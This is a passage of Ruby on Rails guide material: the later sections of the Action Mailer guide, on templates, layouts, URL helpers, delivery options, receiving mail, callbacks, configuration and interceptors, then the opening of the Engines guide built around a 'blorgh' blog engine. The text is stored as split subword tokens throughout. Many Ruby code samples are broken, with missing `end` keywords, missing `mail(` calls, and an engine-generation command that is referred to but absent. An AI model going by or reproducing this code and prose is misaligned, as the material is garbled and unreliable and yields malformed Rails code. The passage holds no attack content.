▁The ▁list ▁of ▁email s ▁can ▁be ▁an ▁array ▁of ▁email ▁addresses ▁or ▁a ▁single ▁string < n > with ▁the ▁addresses ▁separate d ▁by ▁com ma s .
▁class ▁ Admin Mailer ▁< ▁ ActionMailer :: Base
▁default ▁to : ▁ Proc . new ▁ { ▁ Admin . pluck (: email ) ▁ },
▁from : ▁' not if ic ation @ example . com '
▁def ▁new _ re g ist r ation ( user )
▁mail ( subject : ▁" New ▁User ▁Signup : ▁# {@ user . email } ")
▁The ▁same ▁format ▁can ▁be ▁used ▁to ▁set ▁ ca rb on ▁copy ▁( C c : ) ▁and ▁b li n d ▁ ca rb on ▁copy < n > ( B cc : ) ▁re c ip i ent s , ▁by ▁using ▁the ▁`: cc ` ▁and ▁`: b cc ` ▁keys ▁respectively .
▁#### ▁S end ing ▁Email ▁With ▁Name
▁Sometimes ▁you ▁wish ▁to ▁show ▁the ▁name ▁of ▁the ▁person ▁instead ▁of ▁just ▁their ▁email < n > address ▁when ▁they ▁receive ▁the ▁email .
▁The ▁trick ▁to ▁doing ▁that ▁is ▁to ▁format ▁the < n > email ▁address ▁in ▁the ▁format ▁` " F u ll ▁Name ▁< email > " `.
▁def ▁ welcome _ email ( user )
▁@ user ▁= ▁user
▁email _ with _ name ▁= ▁% (" # {@ user . name } " ▁< # {@ user . email } > )
▁mail ( to : ▁email _ with _ name , ▁subject : ▁' Welcome ▁to ▁My ▁A we some ▁ Site ')
▁### ▁Mailer ▁View s
▁Mailer ▁views ▁are ▁located ▁in ▁the ▁` app / views / name _ of _ mailer _ class ` ▁directory .
▁The < n > specific ▁mailer ▁view ▁is ▁known ▁to ▁the ▁class ▁because ▁its ▁name ▁is ▁the ▁same ▁as ▁the < n > mailer ▁method .
▁In ▁our ▁example ▁from ▁above , ▁our ▁mailer ▁view ▁for ▁the < n >` welcome _ email ` ▁method ▁will ▁be ▁in ▁` app / views / user _ mailer / welcome _ email . html . erb `< n > for ▁the ▁HTML ▁version ▁and ▁` welcome _ email . text . erb ` ▁for ▁the ▁plain ▁text ▁version .
▁To ▁change ▁the ▁default ▁mailer ▁view ▁for ▁your ▁action ▁you ▁do ▁something ▁like :
▁mail ( to : ▁@ user . email ,
▁subject : ▁' Welcome ▁to ▁My ▁A we some ▁ Site ' ,
▁template _ path : ▁' notifications ' ,
▁template _ name : ▁' another ')
▁In ▁this ▁case ▁it ▁will ▁look ▁for ▁templates ▁at ▁` app / views / notifications ` ▁with ▁name < n >` another `.
▁You ▁can ▁also ▁specify ▁an ▁array ▁of ▁paths ▁for ▁` template _ path `, ▁and ▁they < n > will ▁be ▁search ed ▁in ▁order .
▁If ▁you ▁want ▁more ▁flexibility ▁you ▁can ▁also ▁pass ▁a ▁block ▁and ▁render ▁specific < n > template s ▁or ▁even ▁render ▁in line ▁or ▁text ▁without ▁using ▁a ▁template ▁file :
▁subject : ▁' Welcome ▁to ▁My ▁A we some ▁ Site ') ▁do ▁| format |
▁format . html ▁ { ▁render ▁' another _ template ' ▁ }
▁format . text ▁ { ▁render ▁text : ▁' Render ▁text ' ▁ }
▁This ▁will ▁render ▁the ▁template ▁' another _ template . html . erb ' ▁for ▁the ▁HTML ▁part ▁and < n > use ▁the ▁rendered ▁text ▁for ▁the ▁text ▁part .
▁The ▁render ▁command ▁is ▁the ▁same ▁one ▁used < n > in side ▁of ▁Action ▁Controller , ▁so ▁you ▁can ▁use ▁all ▁the ▁same ▁options , ▁such ▁as < n >`: text `, ▁`: in line ` ▁etc .
▁### ▁Action ▁Mailer ▁Layouts
▁Ju st ▁like ▁controller ▁views , ▁you ▁can ▁also ▁have ▁mailer ▁layout s .
▁The ▁layout ▁name < n > n e ed s ▁to ▁be ▁the ▁same ▁as ▁your ▁mailer , ▁such ▁as ▁` user _ mailer . html . erb ` ▁and < n >` user _ mailer . text . erb ` ▁to ▁be ▁automatically ▁recognize d ▁by ▁your ▁mailer ▁as ▁a < n > layout .
▁In ▁order ▁to ▁use ▁a ▁different ▁file , ▁call ▁` layout ` ▁in ▁your ▁mailer :
▁layout ▁' a we some ' ▁# ▁use ▁a we some . ( html | text ). erb ▁as ▁the ▁layout
▁Ju st ▁like ▁with ▁controller ▁views , ▁use ▁` yield ` ▁to ▁render ▁the ▁view ▁inside ▁the < n > layout .
▁You ▁can ▁also ▁pass ▁in ▁a ▁` layout : ▁' layout _ name ' ` ▁option ▁to ▁the ▁render ▁call ▁inside < n > the ▁format ▁block ▁to ▁specify ▁different ▁layout s ▁for ▁different ▁format s :
▁mail ( to : ▁user . email ) ▁do ▁| format |
▁format . html ▁ { ▁render ▁layout : ▁' my _ layout ' ▁ }
▁format . text
▁Wi ll ▁render ▁the ▁HTML ▁part ▁using ▁the ▁` my _ layout . html . erb ` ▁file ▁and ▁the ▁text ▁part < n > with ▁the ▁usual ▁` user _ mailer . text . erb ` ▁file ▁if ▁it ▁exists .
▁### ▁Generat ing ▁URLs ▁in ▁Action ▁Mailer ▁View s
▁Un like ▁controllers , ▁the ▁mailer ▁instance ▁does n ' t ▁have ▁any ▁context ▁about ▁the < n > in com ing ▁request ▁so ▁you ' ll ▁need ▁to ▁provide ▁the ▁`: host ` ▁parameter ▁yourself .
▁As ▁the ▁`: host ` ▁usually ▁is ▁consistent ▁across ▁the ▁application ▁you ▁can ▁configure ▁it < n > g lo b ally ▁in ▁` config / application . rb ` :
▁config . action _ mailer . default _ url _ options ▁= ▁ { ▁host : ▁' example . com ' ▁ }
▁Because ▁of ▁this ▁behavior ▁you ▁cannot ▁use ▁any ▁of ▁the ▁` * _ path ` ▁helpers ▁inside ▁of < n > an ▁email .
▁Instead ▁you ▁will ▁need ▁to ▁use ▁the ▁ associated ▁` * _ url ` ▁helper .
▁For ▁example < n > instead ▁of ▁using
▁<%= ▁link _ to ▁' welcome ' , ▁ welcome _ path ▁%>
▁You ▁will ▁need ▁to ▁use :
▁<%= ▁link _ to ▁' welcome ' , ▁ welcome _ url ▁%>
▁By ▁using ▁the ▁full ▁URL , ▁your ▁links ▁will ▁now ▁work ▁in ▁your ▁email s .
▁#### ▁ generating ▁URLs ▁with ▁` url _ for `
▁If ▁you ▁did ▁not ▁configure ▁the ▁`: host ` ▁option ▁g lo b ally ▁make ▁sure ▁to ▁pass ▁it ▁to < n >` url _ for `.
▁<%= ▁url _ for ( host : ▁' example . com ' ,
▁controller : ▁' welcome ' ,
▁action : ▁' greeting ') ▁%>
▁#### ▁ generating ▁URLs ▁with ▁named ▁routes
▁Email ▁clients ▁have ▁no ▁web ▁context ▁and ▁so ▁paths ▁have ▁no ▁base ▁URL ▁to ▁form ▁complete < n > web ▁addresses .
▁Thus , ▁you ▁should ▁always ▁use ▁the ▁" _ url " ▁variant ▁of ▁named ▁route < n > helpers .
▁If ▁you ▁did ▁not ▁configure ▁the ▁`: host ` ▁option ▁g lo b ally ▁make ▁sure ▁to ▁pass ▁it ▁to ▁the < n > url ▁helper .
▁<%= ▁user _ url (@ user , ▁host : ▁' example . com ') ▁%>
▁### ▁S end ing ▁Multi part ▁Email s
▁Action ▁Mailer ▁will ▁automatically ▁send ▁multipart ▁email s ▁if ▁you ▁have ▁different < n > template s ▁for ▁the ▁same ▁action .
▁So , ▁for ▁our ▁User Mailer ▁example , ▁if ▁you ▁have < n >` welcome _ email . text . erb ` ▁and ▁` welcome _ email . html . erb ` ▁in < n >` app / views / user _ mailer `, ▁Action ▁Mailer ▁will ▁automatically ▁send ▁a ▁multipart ▁email < n > with ▁the ▁HTML ▁and ▁text ▁versions ▁setup ▁as ▁different ▁parts .
▁The ▁order ▁of ▁the ▁parts ▁getting ▁inserted ▁is ▁determine d ▁by ▁the ▁`: part s _ order `< n > in side ▁of ▁the ▁` ActionMailer :: Base . default ` ▁method .
▁### ▁S end ing ▁Email s ▁with ▁D y n am ic ▁ Delivery ▁ Options
▁If ▁you ▁wish ▁to ▁override ▁the ▁default ▁delivery ▁options ▁( e . g . ▁S M T P ▁credentials )< n > w h i le ▁ deliver ing ▁email s , ▁you ▁can ▁do ▁this ▁using ▁` delivery _ method _ options ` ▁in ▁the < n > mailer ▁action .
▁def ▁ welcome _ email ( user , ▁company )
▁@ url ▁= ▁user _ url (@ user )
▁delivery _ options ▁= ▁ { ▁user _ name : ▁company . smtp _ user ,
▁password : ▁company . smtp _ password ,
▁address : ▁company . smtp _ host ▁ }
▁subject : ▁" P lease ▁see ▁the ▁T er m s ▁and ▁Conditions ▁attach ed ",
▁delivery _ method _ options : ▁delivery _ options )
▁### ▁S end ing ▁Email s ▁without ▁ Template ▁Rendering
▁There ▁may ▁be ▁cases ▁in ▁which ▁you ▁want ▁to ▁skip ▁the ▁template ▁rendering ▁step ▁and < n > s up p ly ▁the ▁email ▁body ▁as ▁a ▁string .
▁You ▁can ▁achieve ▁this ▁using ▁the ▁`: body `< n > option .
▁In ▁such ▁cases ▁don ' t ▁ forget ▁to ▁add ▁the ▁`: content _ type ` ▁option .
▁Rails < n > will ▁default ▁to ▁` text / plain ` ▁otherwise .
▁def ▁ welcome _ email ( user , ▁email _ body )
▁mail ( to : ▁user . email ,
▁body : ▁email _ body ,
▁content _ type : ▁" text / html ",
▁subject : ▁" A l read y ▁rendered !" )
▁R eceiving ▁Email s
▁R eceiving ▁and ▁pars ing ▁email s ▁with ▁Action ▁Mailer ▁can ▁be ▁a ▁rather ▁complex < n > end e a v or .
▁Before ▁your ▁email ▁reach es ▁your ▁Rails ▁app , ▁you ▁would ▁have ▁ha d ▁to < n > config ure ▁your ▁system ▁to ▁some how ▁forward ▁email s ▁to ▁your ▁app , ▁which ▁needs ▁to ▁be < n > list en ing ▁for ▁that .
▁So , ▁to ▁receive ▁email s ▁in ▁your ▁Rails ▁app ▁you ' ll ▁need ▁to :
▁* ▁Implement ▁a ▁` receive ` ▁method ▁in ▁your ▁mailer .
▁* ▁Configur e ▁your ▁email ▁server ▁to ▁forward ▁email s ▁from ▁the ▁address ( es ) ▁you ▁would < n > ▁like ▁your ▁app ▁to ▁receive ▁to ▁` / path / to / app / bin / rails ▁run n er < n > ▁' User Mailer . receive ( ST D IN . read ) ' `.
▁On ce ▁a ▁method ▁called ▁` receive ` ▁is ▁defined ▁in ▁any ▁mailer , ▁Action ▁Mailer ▁will < n > parse ▁the ▁raw ▁in com ing ▁email ▁into ▁an ▁email ▁object , ▁ de code ▁it , ▁in st ant i ate ▁a ▁new < n > mailer , ▁and ▁pass ▁the ▁email ▁object ▁to ▁the ▁mailer ▁` receive ` ▁instance < n > method .
▁Here ' s ▁an ▁example :
▁def ▁receive ( email )
▁page ▁= ▁P age . find _ by ( address : ▁email . to . first )
▁page . email s . create (
▁subject : ▁email . subject ,
▁body : ▁email . body
▁ )
▁if ▁email . has _ attachment s ?
▁email . attachment s . each ▁do ▁| attachment |
▁page . attachment s . create ( {
▁file : ▁ attachment ,
▁description : ▁email . subject
▁ })
▁Action ▁Mailer ▁ Callbacks
▁Action ▁Mailer ▁allows ▁for ▁you ▁to ▁specify ▁a ▁` before _ action `, ▁` after _ action ` ▁and < n >` ar ound _ action `.
▁* ▁F il ter s ▁can ▁be ▁specified ▁with ▁a ▁block ▁or ▁a ▁symbol ▁to ▁a ▁method ▁in ▁the ▁mailer < n > ▁class ▁similar ▁to ▁controllers .
▁* ▁You ▁could ▁use ▁a ▁` before _ action ` ▁to ▁ populate ▁the ▁mail ▁object ▁with ▁defaults ,< n > ▁delivery _ method _ options ▁or ▁insert ▁default ▁headers ▁and ▁ attachment s .
▁* ▁You ▁could ▁use ▁an ▁` after _ action ` ▁to ▁do ▁similar ▁setup ▁as ▁a ▁` before _ action ` ▁but < n > ▁using ▁instance ▁variables ▁set ▁in ▁your ▁mailer ▁action .
▁after _ action ▁: set _ delivery _ options ,
▁: prev ent _ delivery _ to _ guest s ,
▁: set _ business _ header s
▁def ▁feedback _ message ( business , ▁user )
▁@ business ▁= ▁ business
▁mail
▁def ▁ ca mp a ig n _ message ( business , ▁user )
▁private
▁def ▁set _ delivery _ options
▁# ▁You ▁have ▁access ▁to ▁the ▁mail ▁instance ,
▁# ▁@ business ▁and ▁@ user ▁instance ▁variables ▁here
▁if ▁@ business ▁ && ▁@ business . has _ smtp _ settings ?
▁mail . delivery _ method . settings . merge ! (
▁def ▁prevent _ delivery _ to _ guest s
▁if ▁@ user ▁ && ▁@ user . guest ?
▁mail . perform _ deliveries ▁= ▁false
▁def ▁set _ business _ header s
▁if ▁@ business
▁headers [ " X - S M T P API - C A T E G O R Y "] ▁= ▁@ business . code
▁* ▁Mailer ▁F il ter s ▁a b or t ▁further ▁process ing ▁if ▁body ▁is ▁set ▁to ▁a ▁non - nil ▁value .
▁Using ▁Action ▁Mailer ▁ Helpers
▁Action ▁Mailer ▁now ▁just ▁inherit s ▁from ▁` Abstract Controller `, ▁so ▁you ▁have ▁access ▁to < n > the ▁same ▁generic ▁helpers ▁as ▁you ▁do ▁in ▁Action ▁Controller .
▁Action ▁Mailer ▁Configuration
▁The ▁following ▁configuration ▁options ▁are ▁best ▁made ▁in ▁one ▁of ▁the ▁environment < n > file s ▁( environment . rb , ▁production . rb , ▁etc ...)
▁| ▁Configuration ▁| ▁De script ion ▁|
▁| --------------- | ------------- |
▁| ` logger ` | G en er ate s ▁information ▁on ▁the ▁mail ing ▁run ▁if ▁available .
▁C an ▁be ▁set ▁to ▁` nil ` ▁for ▁no ▁logging .
▁Co mp at i b le ▁with ▁both ▁Ruby ' s ▁own ▁` Logger ` ▁and ▁` Log 4 r ` ▁ logger s .
▁| ` smtp _ settings ` | A l low s ▁ detailed ▁configuration ▁for ▁`: smtp ` ▁delivery ▁method :
▁< ul >< li >`: address ` ▁- ▁A l low s ▁you ▁to ▁use ▁a ▁remote ▁mail ▁server .
▁Ju st ▁change ▁it ▁from ▁its ▁default ▁` " localhost " ` ▁setting . </ li >
▁< li >`: port ` ▁- ▁On ▁the ▁off ▁chance ▁that ▁your ▁mail ▁server ▁does n ' t ▁run ▁on ▁ port ▁2 5 , ▁you ▁can ▁change ▁it . </ li >
▁< li >`: domain ` ▁- ▁If ▁you ▁need ▁to ▁specify ▁a ▁H E L O ▁domain , ▁you ▁can ▁do ▁it ▁here . </ li >
▁< li >`: user _ name ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁set ▁the ▁username ▁in ▁this ▁setting . </ li >
▁< li >`: password ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁set ▁the ▁password ▁in ▁this ▁setting . </ li >
▁< li >`: authentication ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁you ▁need ▁to ▁specify ▁the ▁authentication ▁type ▁here .
▁| ` sendmail _ settings ` | A l low s ▁you ▁to ▁override ▁options ▁for ▁the ▁`: sendmail ` ▁delivery ▁method .
▁< ul >< li >`: location ` ▁- ▁The ▁location ▁of ▁the ▁ sendmail ▁executable .
▁Defaults ▁to ▁` / us r / s bin / sendmail `. </ li >
▁< li >`: argument s ` ▁- ▁The ▁command ▁line ▁arguments ▁to ▁be ▁passed ▁to ▁ sendmail .
▁Defaults ▁to ▁` - i ▁- t `. </ li ></ ul > |
▁| ` raise _ delivery _ errors ` | W hether ▁or ▁not ▁errors ▁should ▁be ▁raised ▁if ▁the ▁email ▁fails ▁to ▁be ▁ deliver ed .
▁This ▁only ▁works ▁if ▁the ▁external ▁email ▁server ▁is ▁configured ▁for ▁imm edia t e ▁delivery .
▁| ` delivery _ method ` | D e f in es ▁a ▁delivery ▁method .
▁P ossible ▁values ▁are : < ul >
▁< li >`: smtp ` ▁( default ), ▁can ▁be ▁configured ▁by ▁using ▁` config . action _ mailer . smtp _ settings `. </ li >
▁< li >`: sendmail `, ▁can ▁be ▁configured ▁by ▁using ▁` config . action _ mailer . sendmail _ settings `. </ li >
▁< li >`: file ` : ▁save ▁email s ▁to ▁files ; ▁can ▁be ▁configured ▁by ▁using ▁` config . action _ mailer . file _ settings `. </ li >
▁< li >`: test ` : ▁save ▁email s ▁to ▁` ActionMailer :: Base . deliveries ` ▁array . </ li >
▁</ ul > S e e ▁[ API ▁ doc s ]( http :// api . rubyonrails . org / classes / ActionMailer / Base . html ) ▁for ▁more ▁ info .
▁| ` perform _ deliveries ` | D e ter m in es ▁whether ▁ deliveries ▁are ▁actually ▁c ar r i ed ▁out ▁when ▁the ▁` deliver ` ▁method ▁is ▁invoked ▁on ▁the ▁ Mail ▁message .
▁By ▁default ▁they ▁are , ▁but ▁this ▁can ▁be ▁turn ed ▁off ▁to ▁help ▁functional ▁testing .
▁| ` deliveries ` | K eep s ▁an ▁array ▁of ▁all ▁the ▁email s ▁sent ▁out ▁through ▁the ▁Action ▁Mailer ▁with ▁delivery _ method ▁: test .
▁ Most ▁useful ▁for ▁ unit ▁and ▁functional ▁testing .
▁| ` default _ options ` | A l low s ▁you ▁to ▁set ▁default ▁values ▁for ▁the ▁` mail ` ▁method ▁options ▁( ` : from `, ▁`: reply _ to `, ▁etc . ).
▁For ▁a ▁complete ▁write up ▁of ▁possible ▁configuration s ▁see ▁the < n >[ Co n fig ur ing ▁Action ▁Mailer ]( configuring . html # configuring - action - mailer ) ▁in < n > our ▁Configur ing ▁Rails ▁Application s ▁guide .
▁### ▁Example ▁Action ▁Mailer ▁Configuration
▁An ▁example ▁would ▁be ▁adding ▁the ▁following ▁to ▁your ▁appropriate < n >` config / environments / $ R AIL S _ ENV . rb ` ▁file :
▁config . action _ mailer . delivery _ method ▁= ▁: sendmail
▁# ▁Defaults ▁to :
▁# ▁config . action _ mailer . sendmail _ settings ▁= ▁ {
▁# ▁location : ▁' / us r / s bin / sendmail ' ,
▁# ▁arguments : ▁' - i ▁- t '
▁config . action _ mailer . perform _ deliveries ▁= ▁true
▁config . action _ mailer . raise _ delivery _ errors ▁= ▁true
▁config . action _ mailer . default _ options ▁= ▁ { from : ▁' no - reply @ example . com ' }
▁### ▁Action ▁Mailer ▁Configuration ▁for ▁G mail
▁As ▁Action ▁Mailer ▁now ▁uses ▁the ▁[ Mail ▁gem ]( https :// github . com / m ike l / mail ), ▁this < n > be com es ▁as ▁simple ▁as ▁adding ▁to ▁your ▁` config / environments / $ R AIL S _ ENV . rb ` ▁file :
▁config . action _ mailer . delivery _ method ▁= ▁: smtp
▁config . action _ mailer . smtp _ settings ▁= ▁ {
▁address : ▁' smtp . g mail . com ' ,
▁ port : ▁5 87 ,
▁domain : ▁' example . com ' ,
▁user _ name : ▁' < user name > ' ,
▁password : ▁' < password > ' ,
▁authentication : ▁' plain ' ,
▁enable _ start t l s _ auto : ▁true ▁ }
▁Mailer ▁Testing
▁You ▁can ▁find ▁ detailed ▁instructions ▁on ▁how ▁to ▁test ▁your ▁mailer s ▁in ▁the < n >[ test ing ▁guide ]( test ing . html # test ing - your - mailer s ).
▁In ter ce p ting ▁Email s
▁ --- ----------------
▁There ▁are ▁situation s ▁where ▁you ▁need ▁to ▁edit ▁an ▁email ▁before ▁it ' s < n > deliver ed .
▁For t un ate ly ▁Action ▁Mailer ▁provides ▁ hook s ▁to ▁intercept ▁every < n > email .
▁You ▁can ▁ register ▁an ▁ interceptor ▁to ▁make ▁modification s ▁to ▁mail ▁messages < n > right ▁before ▁they ▁are ▁hand ed ▁to ▁the ▁delivery ▁a g ent s .
▁class ▁S and box E mail In ter ce p to r
▁def ▁self . deliver ing _ email ( message )
▁message . to ▁= ▁[ ' sandbox @ example . com ']
▁Before ▁the ▁ interceptor ▁can ▁do ▁its ▁job ▁you ▁need ▁to ▁ register ▁it ▁with ▁the ▁Action < n > Mailer ▁framework .
▁You ▁can ▁do ▁this ▁in ▁an ▁initializer ▁file < n >` config / initializers / sandbox _ email _ interceptor . rb `
▁NOTE : ▁The ▁example ▁above ▁uses ▁a ▁custom ▁environment ▁called ▁" staging " ▁for ▁a < n > production ▁like ▁server ▁but ▁for ▁testing ▁purposes .
▁You ▁can ▁read < n >[ C re at ing ▁Rails ▁environments ]( configuring . html # creating - rails - environments )< n > for ▁more ▁information ▁about ▁custom ▁Rails ▁environments .
▁ Getting ▁Start ed ▁with ▁ Engine s
▁In ▁this ▁guide ▁you ▁will ▁learn ▁about ▁engines ▁and ▁how ▁they ▁can ▁be ▁used ▁to ▁provide < n > additional ▁functionality ▁to ▁their ▁host ▁applications ▁through ▁a ▁clean ▁and ▁very < n > e as y - to - use ▁interface .
▁* ▁What ▁make s ▁an ▁engine .
▁* ▁How ▁to ▁generate ▁an ▁engine .
▁* ▁B u il d ing ▁features ▁for ▁the ▁engine .
▁* ▁H oo k ing ▁the ▁engine ▁into ▁an ▁application .
▁* ▁ Overriding ▁engine ▁functionality ▁in ▁the ▁application .
▁What ▁are ▁engines ?
▁ Engine s ▁can ▁be ▁consider ed ▁ mini at ure ▁applications ▁that ▁provide ▁functionality ▁to < n > the ir ▁host ▁applications .
▁A ▁Rails ▁application ▁is ▁actually ▁just ▁a ▁" super cha r g ed " < n > engine , ▁with ▁the ▁` Rails :: Application ` ▁class ▁inherit ing ▁a ▁lot ▁of ▁its ▁behavior < n > from ▁` Rails :: Engine `.
▁There for e , ▁engines ▁and ▁applications ▁can ▁be ▁though t ▁of ▁ almost ▁the ▁same ▁thing ,< n > j us t ▁with ▁subtle ▁difference s , ▁as ▁you ' ll ▁see ▁throughout ▁this ▁guide .
▁ Engine s ▁and < n > application s ▁also ▁share ▁a ▁common ▁structure .
▁ Engine s ▁are ▁also ▁close ly ▁related ▁to ▁plugin s .
▁The ▁two ▁share ▁a ▁common ▁` lib `< n > directory ▁structure , ▁and ▁are ▁both ▁generated ▁using ▁the ▁` rails ▁plugin ▁new `< n > generator .
▁The ▁difference ▁is ▁that ▁an ▁engine ▁is ▁consider ed ▁a ▁" full ▁plugin " ▁by < n > Rails ▁( as ▁indicate d ▁by ▁the ▁`-- full ` ▁option ▁that ' s ▁passed ▁to ▁the ▁generator < n > command ).
▁We ' ll ▁actually ▁be ▁using ▁the ▁`-- m o un table ` ▁option ▁here , ▁which ▁includes < n > all ▁the ▁features ▁of ▁`-- full `, ▁and ▁the n ▁some .
▁This ▁guide ▁will ▁refer ▁to ▁these < n > " full ▁plugin s " ▁simply ▁as ▁" engine s " ▁throughout .
▁An ▁engine ▁** can ** ▁be ▁a ▁plugin ,< n > and ▁a ▁plugin ▁** can ** ▁be ▁an ▁engine .
▁The ▁engine ▁that ▁will ▁be ▁created ▁in ▁this ▁guide ▁will ▁be ▁called ▁" blorgh ".
▁This < n > engine ▁will ▁provide ▁b logging ▁functionality ▁to ▁its ▁host ▁applications , ▁allow ing < n > for ▁new ▁articles ▁and ▁comments ▁to ▁be ▁created .
▁At ▁the ▁beginning ▁of ▁this ▁guide , ▁you < n > will ▁be ▁working ▁so le ly ▁within ▁the ▁engine ▁itself , ▁but ▁in ▁later ▁section s ▁you ' ll < n > see ▁how ▁to ▁ hook ▁it ▁into ▁an ▁application .
▁ Engine s ▁can ▁also ▁be ▁is olated ▁from ▁their ▁host ▁applications .
▁This ▁means ▁that ▁an < n > application ▁is ▁able ▁to ▁have ▁a ▁path ▁provided ▁by ▁a ▁routing ▁helper ▁such ▁as < n >` articles _ path ` ▁and ▁use ▁an ▁engine ▁also ▁that ▁provides ▁a ▁path ▁also ▁called < n >` articles _ path `, ▁and ▁the ▁two ▁would ▁not ▁cl as h .
▁A long ▁with ▁this , ▁controllers , ▁models < n > and ▁table ▁names ▁are ▁also ▁namespaced .
▁You ' ll ▁see ▁how ▁to ▁do ▁this ▁later ▁in ▁this < n > guid e .
▁It ' s ▁important ▁to ▁keep ▁in ▁mind ▁at ▁all ▁time s ▁that ▁the ▁application ▁should < n > ** always ** ▁take ▁precedence ▁over ▁its ▁engines .
▁An ▁application ▁is ▁the ▁object ▁that < n > has ▁final ▁say ▁in ▁what ▁go es ▁on ▁in ▁its ▁environment .
▁The ▁engine ▁should < n > only ▁be ▁ en ha n c ing ▁it , ▁rather ▁than ▁changing ▁it ▁d ra s tic ally .
▁To ▁see ▁ demo n str ation s ▁of ▁other ▁engines , ▁check ▁out < n >[ D evi se ]( https :// github . com / plat a format ec / devise ), ▁an ▁engine ▁that ▁provides < n > authentication ▁for ▁its ▁ parent ▁applications , ▁or < n >[ For em ]( https :// github . com / ra d ar / for em ), ▁an ▁engine ▁that ▁provides ▁for um < n > functionality .
▁There ' s ▁also ▁[ S pre e ]( https :// github . com / s pre e / s pre e ) ▁which < n > provide s ▁an ▁e - com m er ce ▁platform , ▁and < n >[ Re f ine ry C M S ]( https :// github . com / ref ine ry / ref ine ry c m s ), ▁a ▁C M S ▁engine .
▁F inally , ▁engines ▁would ▁not ▁have ▁been ▁possible ▁without ▁the ▁work ▁of ▁ J am es ▁A d am ,< n > P io tr ▁S ar n ac k i , ▁the ▁Rails ▁Co re ▁T e am , ▁and ▁a ▁number ▁of ▁other ▁people .
▁If ▁you ▁ever < n > me et ▁them , ▁don ' t ▁ forget ▁to ▁say ▁than k s !
▁Generat ing ▁an ▁engine
▁To ▁generate ▁an ▁engine , ▁you ▁will ▁need ▁to ▁run ▁the ▁plugin ▁generator ▁and ▁pass ▁it < n > options ▁as ▁appropriate ▁to ▁the ▁need .
▁For ▁the ▁" blorgh " ▁example , ▁you ▁will ▁need ▁to < n > create ▁a ▁" m o un table " ▁engine , ▁running ▁this ▁command ▁in ▁a ▁terminal :
▁The ▁full ▁list ▁of ▁options ▁for ▁the ▁plugin ▁generator ▁may ▁be ▁seen ▁by ▁typing :
▁The ▁`-- m o un table ` ▁option ▁tell s ▁the ▁generator ▁that ▁you ▁want ▁to ▁create ▁a < n > " m o un table " ▁and ▁ namespace - isolate d ▁engine .
▁This ▁generator ▁will ▁provide ▁the ▁same < n > s k e leton ▁structure ▁as ▁would ▁the ▁`-- full ` ▁option .
▁The ▁`-- full ` ▁option ▁tell s ▁the < n > generator ▁that ▁you ▁want ▁to ▁create ▁an ▁engine , ▁including ▁a ▁ s k e leton ▁structure < n > that ▁provides ▁the ▁following :
▁* ▁An ▁` app ` ▁directory ▁ tree
▁* ▁A ▁` config / routes . rb ` ▁file :
▁Rails . application . routes . d raw ▁do
▁* ▁A ▁file ▁at ▁` lib / blorgh / engine . rb `, ▁which ▁is ▁identical ▁in ▁function ▁to ▁a < n > ▁standard ▁Rails ▁application ' s ▁` config / application . rb ` ▁file :
▁module ▁Blorgh
▁class ▁ Engine ▁< ▁: : Rails :: Engine
▁end
▁The ▁`-- m o un table ` ▁option ▁will ▁add ▁to ▁the ▁`-- full ` ▁option :
▁* ▁ Asset ▁manifest ▁files ▁( ` application . js ` ▁and ▁` application . css `)
▁* ▁A ▁namespaced ▁` Application Controller ` ▁ stub
▁* ▁A ▁namespaced ▁` Application Helper ` ▁ stub
▁* ▁A ▁layout ▁view ▁template ▁for ▁the ▁engine
▁* ▁Name space ▁is ol ation ▁to ▁` config / routes . rb ` :
▁Blorgh :: Engine . routes . d raw ▁do
▁* ▁Name space ▁is ol ation ▁to ▁` lib / blorgh / engine . rb ` :
▁ isolate _ namespace ▁Blorgh
▁Add it ion ally , ▁the ▁`-- m o un table ` ▁option ▁tell s ▁the ▁generator ▁to ▁m o un t ▁the ▁engine < n > in side ▁the ▁ dummy ▁testing ▁application ▁located ▁at ▁` test / dummy ` ▁by ▁adding ▁the < n > following ▁to ▁the ▁ dummy ▁application ' s ▁routes ▁file ▁at < n >` test / dummy / config / routes . rb ` :
▁m o un t ▁Blorgh :: Engine ▁=> ▁" / blorgh "
▁### ▁In side ▁an ▁ Engine
▁#### ▁C r it ical ▁File s
▁At ▁the ▁root ▁of ▁this ▁ br and ▁new ▁engine ' s ▁directory ▁live s ▁a ▁` blorgh . gem spec ` ▁file . < n >
▁When ▁you ▁include ▁the ▁engine ▁into ▁an ▁application ▁later ▁on , ▁you ▁will ▁do ▁so ▁with < n > this ▁line ▁in ▁the ▁Rails ▁application ' s ▁` Gemfile ` :
▁gem ▁' blorgh ' , ▁path : ▁" vendor / engine s / blorgh "
▁Do n ' t ▁ forget ▁to ▁run ▁` bundle ▁install ` ▁as ▁usual .
▁By ▁specify ing ▁it ▁as ▁a ▁gem ▁within < n > the ▁` Gemfile `, ▁Bundler ▁will ▁load ▁it ▁as ▁such , ▁pars ing ▁this ▁` blorgh . gem spec ` ▁file < n > and ▁requiring ▁a ▁file ▁within ▁the ▁` lib ` ▁directory ▁called ▁` lib / blorgh . rb `.
▁This < n > file ▁requires ▁the ▁` blorgh / engine . rb ` ▁file ▁( lo cat ed ▁at ▁` lib / blorgh / engine . rb ` )< n > and ▁defines ▁a ▁base ▁module ▁called ▁` Blorgh `.
▁require ▁" blorgh / engine "
▁module ▁Blorgh
▁TIP : ▁Some ▁engines ▁choose ▁to ▁use ▁this ▁file ▁to ▁put ▁g lo b al ▁configuration ▁options < n > for ▁their ▁engine .
▁It ' s ▁a ▁relative ly ▁good ▁idea , ▁so ▁if ▁you ▁want ▁to ▁offer < n > configuration ▁options , ▁the ▁file ▁where ▁your ▁engine ' s ▁` module ` ▁is ▁defined ▁is < n > perfect ▁for ▁that .
▁P la ce ▁the ▁methods ▁inside ▁the ▁module ▁and ▁you ' ll ▁be ▁good ▁to ▁go .
▁With in ▁` lib / blorgh / engine . rb ` ▁is ▁the ▁base ▁class ▁for ▁the ▁engine :
▁class ▁ Engine ▁< ▁: : Rails :: Engine
▁ isolate _ namespace ▁Blorgh
